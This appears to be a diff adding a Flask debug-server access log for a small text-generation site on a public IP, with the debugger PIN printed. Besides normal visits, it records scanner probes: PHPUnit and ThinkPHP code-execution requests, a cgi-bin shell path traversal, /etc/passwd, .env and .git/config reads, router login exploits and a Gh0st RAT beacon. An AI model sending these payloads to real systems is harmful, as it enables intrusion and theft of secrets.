@@ -1,0 +1,1632 @@
+ * Serving Flask app 'app'
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://45.146.166.164:80
+Press CTRL+C to quit
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 617-352-953
+62.84.32.240 - - [12/May/2023 18:00:32] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:00:32] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 18:00:37] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:00:37] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.103 - - [12/May/2023 18:00:52] "GET / HTTP/1.1" 200 -
+176.222.167.103 - - [12/May/2023 18:00:52] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:00:55] "POST /generate_text HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:00:55] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 18:00:58] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:00:58] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 18:05:16] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 18:05:16] "GET /static/style.css HTTP/1.1" 304 -
+220.94.228.163 - - [12/May/2023 19:25:24] "GET / HTTP/1.1" 200 -
+220.94.228.163 - - [12/May/2023 19:27:31] "GET / HTTP/1.1" 200 -
+220.94.228.163 - - [12/May/2023 19:31:46] "GET / HTTP/1.1" 200 -
+183.136.225.42 - - [12/May/2023 19:35:53] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03uÁ\x92\x03\x96\x9cg1+9aSÑ\x0f')
+183.136.225.42 - - [12/May/2023 19:35:53] "\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03uÁ\x92\x03\x96\x9cg1+9aSÑ\x0f\x0b\x8fÙd\x93ÚÜ¬øFC¶/\x80\x000P\x97\x00\x00Ú\x00\x05\x00\x04\x00\x02\x00\x01\x00\x16\x003\x009\x00:\x00\x18\x005\x00" HTTPStatus.BAD_REQUEST -
+220.94.228.163 - - [12/May/2023 19:41:07] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [12/May/2023 19:46:39] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 19:56:44] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 -
+220.94.228.163 - - [12/May/2023 19:59:58] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:04:48] "GET /robots.txt HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:04:49] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:04:49] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:04:50] "GET /favicon.ico HTTP/1.1" 404 -
+35.89.108.172 - - [12/May/2023 20:05:36] "GET /.well-known/acme-challenge/iaMBayjdHIkUp4ddVUCwDEA1E-SStDFDKq6SFR4QxKs HTTP/1.1" 404 -
+23.178.112.202 - - [12/May/2023 20:05:36] "GET /.well-known/acme-challenge/iaMBayjdHIkUp4ddVUCwDEA1E-SStDFDKq6SFR4QxKs HTTP/1.1" 404 -
+18.116.118.75 - - [12/May/2023 20:05:36] "GET /.well-known/acme-challenge/iaMBayjdHIkUp4ddVUCwDEA1E-SStDFDKq6SFR4QxKs HTTP/1.1" 404 -
+34.215.199.75 - - [12/May/2023 20:08:28] "GET /.well-known/acme-challenge/X5rG-_tHc2H0pGgUIQhLEj-MLKGhw7jhtaknThjEkn8 HTTP/1.1" 404 -
+3.138.202.102 - - [12/May/2023 20:08:28] "GET /.well-known/acme-challenge/X5rG-_tHc2H0pGgUIQhLEj-MLKGhw7jhtaknThjEkn8 HTTP/1.1" 404 -
+23.178.112.106 - - [12/May/2023 20:08:28] "GET /.well-known/acme-challenge/X5rG-_tHc2H0pGgUIQhLEj-MLKGhw7jhtaknThjEkn8 HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 20:10:21] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:10:38] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:10:38] "GET /static/style.css HTTP/1.1" 304 -
+3.138.202.102 - - [12/May/2023 20:11:32] "GET /.well-known/acme-challenge/remijs-UwKGORR68Exd5eHurqDjywhu4sikKseblCGE HTTP/1.1" 404 -
+34.215.199.75 - - [12/May/2023 20:11:32] "GET /.well-known/acme-challenge/remijs-UwKGORR68Exd5eHurqDjywhu4sikKseblCGE HTTP/1.1" 404 -
+23.178.112.202 - - [12/May/2023 20:11:35] "GET /.well-known/acme-challenge/remijs-UwKGORR68Exd5eHurqDjywhu4sikKseblCGE HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:15:52] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:15:52] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 20:16:04] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:16:04] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 20:17:36] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:17:36] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:17:37] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:19:04] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:19:04] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 20:19:06] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:19:14] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:19:14] "GET /static/style.css HTTP/1.1" 304 -
+141.98.6.151 - - [12/May/2023 20:19:18] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:19:31] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:19:31] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:20:10] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:20:10] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 20:20:11] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 20:21:15] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:21:15] "GET /static/style.css HTTP/1.1" 304 -
+62.84.32.240 - - [12/May/2023 20:21:26] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 20:21:26] "GET /static/style.css HTTP/1.1" 304 -
+152.89.196.144 - - [12/May/2023 20:21:42] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 20:27:54] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 -
+220.94.228.163 - - [12/May/2023 20:34:56] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [12/May/2023 20:37:50] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
+137.184.74.171 - - [12/May/2023 20:47:31] "GET /systembc/ HTTP/1.1" 404 -
+112.94.96.89 - - [12/May/2023 20:47:36] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 20:59:15] "GET /console/ HTTP/1.1" 404 -
+62.84.32.240 - - [12/May/2023 21:06:27] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [12/May/2023 21:06:27] "GET /static/style.css HTTP/1.1" 304 -
+170.155.150.152 - - [12/May/2023 21:10:22] "GET / HTTP/1.0" 200 -
+152.89.196.144 - - [12/May/2023 21:12:46] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 21:16:58] "GET /_ignition/execute-solution HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 21:26:49] "GET / HTTP/1.1" 200 -
+95.214.27.80 - - [12/May/2023 21:32:19] "GET /.git/config HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 21:36:53] "POST /cgi-bin/../../../../bin/sh HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 21:48:15] "GET / HTTP/1.1" 200 -
+152.89.196.144 - - [12/May/2023 21:59:35] "GET /actuator/gateway/routes HTTP/1.1" 404 -
+152.89.196.144 - - [12/May/2023 22:19:25] "GET /geoserver HTTP/1.1" 404 -
+128.14.141.34 - - [12/May/2023 22:31:20] "GET / HTTP/1.1" 200 -
+165.232.170.200 - - [12/May/2023 22:38:03] "GET / HTTP/1.1" 200 -
+165.232.170.200 - - [12/May/2023 22:39:08] "GET /.env HTTP/1.1" 404 -
+205.209.96.90 - - [12/May/2023 22:58:07] "GET / HTTP/1.1" 200 -
+87.121.221.49 - - [12/May/2023 23:11:47] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+85.217.144.133 - - [12/May/2023 23:17:04] "GET /.env HTTP/1.1" 404 -
+85.217.144.133 - - [12/May/2023 23:17:04] "POST / HTTP/1.1" 405 -
+134.122.184.11 - - [12/May/2023 23:45:03] "GET /video/139239.html HTTP/1.1" 404 -
+172.173.162.161 - - [13/May/2023 00:39:20] "GET / HTTP/1.1" 200 -
+172.173.162.161 - - [13/May/2023 00:39:21] "GET /api.json HTTP/1.1" 404 -
+172.104.155.16 - - [13/May/2023 00:46:36] "GET / HTTP/1.1" 200 -
+179.43.177.243 - - [13/May/2023 01:03:47] "GET / HTTP/1.1" 200 -
+198.235.24.102 - - [13/May/2023 01:28:15] "GET / HTTP/1.0" 200 -
+172.104.242.173 - - [13/May/2023 01:52:27] code 400, message Bad request version ('¯+\xadKkÅà\\s\x9c½Ë')
+172.104.242.173 - - [13/May/2023 01:52:27] "º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬ 9×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02­\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2 íÀ}!Rw\x14\x8e\x1bÄá ¯+­KkÅà\\s\x9c½Ë" HTTPStatus.BAD_REQUEST -
+45.155.204.56 - - [13/May/2023 02:19:47] "GET / HTTP/1.0" 200 -
+181.111.219.253 - - [13/May/2023 02:31:29] "GET / HTTP/1.1" 200 -
+103.14.26.208 - - [13/May/2023 02:39:10] "GET /restore.php HTTP/1.1" 404 -
+66.240.205.34 - - [13/May/2023 03:33:21] code 400, message Bad request version ('®¯]')
+66.240.205.34 - - [13/May/2023 03:33:21] "Gh0st­\x00\x00\x00à\x00\x00\x00x\x9cKS``\x98ÃÀÀÀ\x06Ä\x8c@¼Q\x96\x81\x81\x09H\x07§\x16\x95e&§*\x04$&g+\x182\x94ö°00¬¨rc\x00\x01\x11 \x82\x1f\\`&\x83ÇK7\x86\x19ån\x0c9\x95n\x0c;\x84\x0f3¬èsch¨^Ï4'J\x97©\x82ã0Ã\x91h]&\x90øÎ\x97SËA4L?2=áÄ\x92\x86\x0b@õ`\x0cT\x1f®¯]" HTTPStatus.BAD_REQUEST -
+34.78.6.216 - - [13/May/2023 03:57:30] "GET / HTTP/1.1" 200 -
+185.180.143.72 - - [13/May/2023 04:25:10] "GET / HTTP/1.1" 200 -
+179.43.177.243 - - [13/May/2023 04:50:00] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+128.1.248.42 - - [13/May/2023 05:10:03] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [13/May/2023 05:15:01] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [13/May/2023 05:15:01] "GET /static/style.css HTTP/1.1" 304 -
+107.170.233.15 - - [13/May/2023 06:17:04] code 400, message Bad request syntax ('MGLNDD_45.146.166.164_80')
+107.170.233.15 - - [13/May/2023 06:17:04] "MGLNDD_45.146.166.164_80" HTTPStatus.BAD_REQUEST -
+103.38.237.172 - - [13/May/2023 06:57:02] "GET / HTTP/1.1" 200 -
+67.209.193.96 - - [13/May/2023 07:24:28] "GET / HTTP/1.1" 200 -
+172.104.131.24 - - [13/May/2023 07:35:37] "GET /card HTTP/1.1" 404 -
+167.94.145.60 - - [13/May/2023 08:03:26] "GET / HTTP/1.1" 200 -
+167.94.145.60 - - [13/May/2023 08:03:26] "GET / HTTP/1.1" 200 -
+167.94.145.60 - - [13/May/2023 08:03:26] code 505, message Invalid HTTP version (2.0)
+167.94.145.60 - - [13/May/2023 08:03:26] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.145.60 - - [13/May/2023 08:03:26] "GET /favicon.ico HTTP/1.1" 404 -
+62.84.32.240 - - [13/May/2023 08:08:21] "GET / HTTP/1.1" 200 -
+62.84.32.240 - - [13/May/2023 08:08:21] "GET /static/style.css HTTP/1.1" 200 -
+62.84.32.240 - - [13/May/2023 08:08:22] "GET /favicon.ico HTTP/1.1" 404 -
+205.210.31.210 - - [13/May/2023 10:12:47] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03È\x04\x92Wàî[ÎÆn±\x99\x88\x03ÃwÃLR«*þ¢\x9e\x12Ãú\x16\x86Ü\x92·\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+205.210.31.210 - - [13/May/2023 10:12:47] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03È\x04\x92Wàî[ÎÆn±\x99\x88\x03ÃwÃLR«*þ¢\x9e\x12Ãú\x16\x86Ü\x92·\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
+165.73.98.105 - - [13/May/2023 10:12:56] "GET / HTTP/1.1" 200 -
+209.141.60.140 - - [13/May/2023 10:32:39] "HEAD /robots.txt HTTP/1.0" 404 -
+209.141.60.140 - - [13/May/2023 11:18:28] "HEAD /robots.txt HTTP/1.0" 404 -
+193.42.32.124 - - [13/May/2023 11:26:18] "GET / HTTP/1.1" 200 -
+88.87.70.66 - - [13/May/2023 11:53:44] "GET /System/configurationFile?auth=YWRtaW46MTEK HTTP/1.1" 404 -
+88.87.70.66 - - [13/May/2023 11:53:46] "GET /current_config/passwd HTTP/1.1" 404 -
+88.87.70.66 - - [13/May/2023 11:53:46] "GET /current_config/Account1 HTTP/1.1" 404 -
+88.87.70.66 - - [13/May/2023 11:53:47] "GET /mnt/mtd/Config/Account1 HTTP/1.1" 404 -
+88.87.70.66 - - [13/May/2023 11:53:48] "GET /etc/passwd HTTP/1.1" 404 -
+88.87.70.66 - - [13/May/2023 11:53:49] "GET /etc/passwd%00 HTTP/1.1" 404 -
+198.199.106.198 - - [13/May/2023 11:55:45] "GET /portal/redlion HTTP/1.1" 404 -
+172.105.99.206 - - [13/May/2023 11:59:21] "GET / HTTP/1.1" 200 -
+172.105.99.206 - - [13/May/2023 12:17:52] "GET / HTTP/1.1" 200 -
+107.170.225.28 - - [13/May/2023 12:23:13] "GET /actuator/health HTTP/1.1" 404 -
+138.68.208.21 - - [13/May/2023 12:29:02] "GET /hudson HTTP/1.1" 404 -
+209.141.60.140 - - [13/May/2023 13:11:39] "GET / HTTP/1.1" 200 -
+69.164.217.245 - - [13/May/2023 13:48:28] "GET / HTTP/1.1" 200 -
+109.205.213.30 - - [13/May/2023 13:57:24] "GET / HTTP/1.1" 200 -
+66.175.213.4 - - [13/May/2023 14:05:36] code 400, message Bad request version ('M\x86é\x89á#9\x89f')
+66.175.213.4 - - [13/May/2023 14:05:36] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03+\x93Co\x0c0°ñ\x9bø\x0c\x9a\x99\x07õ~ M\x86é\x89á#9\x89f" HTTPStatus.BAD_REQUEST -
+167.94.146.59 - - [13/May/2023 14:35:09] "GET / HTTP/1.1" 200 -
+167.94.146.59 - - [13/May/2023 14:35:09] "GET / HTTP/1.1" 200 -
+167.94.146.59 - - [13/May/2023 14:35:10] code 505, message Invalid HTTP version (2.0)
+167.94.146.59 - - [13/May/2023 14:35:10] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+167.94.146.59 - - [13/May/2023 14:35:10] "GET /favicon.ico HTTP/1.1" 404 -
+66.175.213.4 - - [13/May/2023 15:01:47] "GET / HTTP/1.1" 200 -
+193.42.32.124 - - [13/May/2023 15:04:24] "GET / HTTP/1.1" 200 -
+152.32.234.33 - - [13/May/2023 15:12:22] "GET / HTTP/1.1" 200 -
+87.121.221.49 - - [13/May/2023 15:34:50] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+176.222.167.66 - - [13/May/2023 15:41:06] "GET / HTTP/1.1" 200 -
+176.222.167.66 - - [13/May/2023 15:41:06] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.66 - - [13/May/2023 15:41:07] "GET /favicon.ico HTTP/1.1" 404 -
+188.124.56.207 - - [13/May/2023 16:13:11] "GET / HTTP/1.1" 200 -
+188.124.56.207 - - [13/May/2023 16:13:11] "GET /api.json HTTP/1.1" 404 -
+2.184.131.117 - - [13/May/2023 16:44:05] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:07:15] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:07:15] "GET /static/style.css HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:07:49] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:07:49] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:09:03] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:09:03] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:09:27] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:09:27] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:09:40] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:09:40] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:09:51] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:09:51] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:10:14] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:10:14] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:10:41] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:10:42] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:11:01] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:11:01] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:11:58] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:11:59] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:12:32] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:12:33] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:12:59] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:12:59] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:13:04] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:13:04] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:13:14] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:13:14] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:13:16] "GET / HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:13:17] "GET /static/style.css HTTP/1.1" 304 -
+176.222.167.92 - - [13/May/2023 17:14:05] "POST /generate_text HTTP/1.1" 200 -
+176.222.167.92 - - [13/May/2023 17:14:05] "GET /static/style.css HTTP/1.1" 304 -
+95.214.27.136 - - [13/May/2023 17:35:29] "GET / HTTP/1.1" 200 -
+95.214.27.136 - - [13/May/2023 17:46:38] "GET / HTTP/1.1" 200 -
+45.128.232.121 - - [13/May/2023 18:02:34] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+109.237.98.226 - - [13/May/2023 19:25:04] "GET /.env HTTP/1.1" 404 -
+109.237.98.226 - - [13/May/2023 19:25:04] code 400, message Bad request version ('yø05\x8eIk\x11N¯Ô\x99\x93¯ÝpP··JÇíépK1ÌqK\x14#P\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+109.237.98.226 - - [13/May/2023 19:25:04] "\x16\x03\x01\x01H\x01\x00\x01D\x03\x03Ç\x96ÈÈwIÝ\x08\x95\x0c\x09ô\x9b\x1bÔØQôn»>\x8b±\x95bzª\x12\x9dLÂ\x88 yø05\x8eIk\x11N¯Ô\x99\x93¯ÝpP··JÇíépK1ÌqK\x14#P\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À­À$À(À" HTTPStatus.BAD_REQUEST -
+109.239.43.3 - - [13/May/2023 19:37:21] "GET / HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:37:22] "GET /static/style.css HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:37:22] "GET /favicon.ico HTTP/1.1" 404 -
+109.239.43.3 - - [13/May/2023 19:38:04] "POST /generate_text HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:38:04] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:38:12] "GET / HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:38:13] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:40:16] "POST /generate_text HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:40:16] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:40:25] "GET / HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:40:26] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:41:17] "POST /generate_text HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:41:17] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:42:04] "GET / HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:42:05] "GET /static/style.css HTTP/1.1" 304 -
+109.239.43.3 - - [13/May/2023 19:42:41] "POST /generate_text HTTP/1.1" 200 -
+109.239.43.3 - - [13/May/2023 19:42:41] "GET /static/style.css HTTP/1.1" 304 -
+205.210.31.51 - - [13/May/2023 19:51:26] "GET / HTTP/1.0" 200 -
+80.66.77.238 - - [13/May/2023 19:59:51] "GET / HTTP/1.1" 200 -
+193.42.32.124 - - [13/May/2023 20:11:36] "GET / HTTP/1.1" 200 -
+172.105.99.206 - - [13/May/2023 20:25:50] "GET / HTTP/1.1" 200 -
+43.135.123.64 - - [13/May/2023 21:13:33] code 400, message Bad request version ('âûuGEº_¯YçP+öPãKyëÖ\x8cdÑ\x00é¢í\x16\x08IRMkÉ-\x7f¾ìµT')
+43.135.123.64 - - [13/May/2023 21:13:33] "ÿ¢ÿ\x00ÿ=ÿ­ÿ\x00ÿÑÿØñ­ÿ¾Hû_5ÿ­ñ\x0dlåúp\x037\x95­ÍØ¢m\x06\x83x ç°\x0b¯\x17i\x8f\x83ç¾\x9d¯È\x8b\x86Ä\x96v~9,\x05\x03¨*\x95\x14\x12\x8föp\x98DÊ$ï$¯\x8e¬\x19Â+\x09\x83\x16ÊsÙ\\&'âõú?±\x11\x85\x12Hw\x7fF»¿[âã\x0fÄ&ôÁÂ+}k{/C'qléÓ\x13M©/5\x87j{Î+9õA}(¡ÏzÜ¯¤Ý\x12é\x8d¶ÉR\x84\\Dì\x9ao¸ó\x91\x9bN\x1bO£`\x1f\x8aÜaXaî¾\x87i4\x94ÔÄà\x8a\x9f[·¹`ßeºms]\x0dC\x1f<è-Ñº\x8dÙ,Ô\x1d£oà6£î¶h±¬\x03\x91^êÑ\x12ôIÿ\x97\x9f\x16äáç\x93\x16û¹ç\x95?Æf}ð\x9c\x92\x97£ð\x8f\x0b6éÆ¿K\x84\x89(OÒ&\x80\x1a«4Ó_ Æ¤"öHmÖ6åõ\x8aÁz\x06d`\x1cð²\x90âË\x9fßÈ`L\x00\x90y=ib\x01\x87#\x0f\x0e|æÁ\x9fÖ\x88H\x104~<ØLU\\}÷\x18ÿÉ.`E1ê\x08²}-t\x93Ç\x14à}Ðí\x16R7p$\x08'á\x91ÿ¯\x01Ì\x94"\x1artôq\x8fç)js'\x86X\x05°\x92d¨\x0d?æ\x1a.c(8vü/b"Eý\x1dª\x93kQ6%\x9eOÕ\x8dB\x80\x8bÝG\x0f^ù\x1aÐõýì^ïCû(\x19p<Ý\x9a9\x17ÇÉ\x9eöLæ§t\x9fÚ\x13C´­È\x0b\x94}D\x97\x16¶\x10¯f'\x05\x86!§\x06xqë\x1a\x88 ÞDS\x170´·\\á\x1d\x87C¹ìeªC<\x06¼ØÏfßX\x14­\x13¾\x86\x9czoúP \x860Þ(¤þ`Fè\x93\x96Â½Ë\x01Ë w¨ò\x88mP¬\x88S\x15\x8d\x05\x0c\x0cJ\x92\x85ëøM\x804Ú_\x15Úè\x1eÐ\x9bÌô\x84«\x1aÊ6ñöH\x9a¸Fß'»ïµúÜÃ*\x0e@¥`+þúÞO<Lj\x9cÐ~"TÃNú^ß\x1e\x7fÎ½°@~>Oú´ã ã?\x9eEâ\x1d\x0btÄ?\x1f2¡ÐÅí\x81:×Õ\x0fÌ\x1aWyÊ\x01l\x85\x8c¹´Ù¶¤I\x11ñë\x9e²xH¦¼ìL\x87\x01\x8eÅ$FJeBfb4\x87\x0b.°¨\x19ÆÈ1Ãx\\}äõéª~\x0cÄ\x8cíÍ·æ\x09 âûuGEº_¯YçP+öPãKyëÖ\x8cdÑ\x00é¢í\x16\x08IRMkÉ-\x7f¾ìµT" HTTPStatus.BAD_REQUEST -
+43.135.123.64 - - [13/May/2023 21:13:33] code 400, message Bad request version ('\x95aÞ«¨·£§;\x19Þ³×')
+43.135.123.64 - - [13/May/2023 21:13:33] "oúÀ¾¸À¤É\x89¢Â\x8f\x83¯\x91\x97¾Í¹Ï¬\x9b°« ¶±ª\x9d\x9c\x9f\x96\x8d\x93Î´³µ\x98Í¦úúúú\x12ýØøúúÂúúúú\x1afìùúúúúûåqòúúúúúúùwh\x97uiºê=Eð\x1b/§XJñ1Y\x0b¿±K\x1f\x00úø¯5YÛ¡¢ à0ÌºU]<\x15\x14ºÇW7c\x02\x98É96\x95\x1cÅ\x164yRç\x8c\x90\x8e\x06\x92wÍé\x0e\x14!\x19\x87KEá\x86 ,)ê\x85_\x16I(\x86\x8b?­Xx×ç¶7\x83ñü;\x83È\x0f®Ý\x1aÊ¿Óð\x98ªÙ=ÐÐÖï«QZ`¼rhc@[\x9czê\x8aJ|\x8fï\x86V\x11Ü»\\øTó=\x9b¯\x11½8\x96­çe~`ovÌ¶ÊÞ·8ÜØ8w9\x91\x8cÑÞ/\x98Ê\x8d%Ü\x85+sb®å&Ê\x08\x06ÿ\x9ev¥\x96í\x0f¼ê2ú\x1f7\x03Ég\x83)TF$H¨Ò¢4\x91\x80«g\x0cF+¿x*w\x19\x01\x0eÿÏ\x1b¨\x9aJrF.\x0b\x9d\x84òî\x80Y\x18Ô\x12þ\x14\x89\x9b\x8c\x9aL6\x17\x09ò5\\íb\x02\x89Í§|ÉzL\x97\x81\x92\x96£Äg´(ãk\x82GkÁ\x90Bæ][á\x02\x9b\x86?Tua\x1càü\x9f\x8dë\x01«ÀåÖ\x98Õà<\x93ê\x00\x8dTé\x05\x04y-G\x0eÅR\x0e\x18ôÁÖ\x8e½i»f¼1Z-ý\x90N\x16\x81\x07C*mk\x11¼Z\x02\x85\x95aÞ«¨·£§;\x19Þ³×" HTTPStatus.BAD_REQUEST -
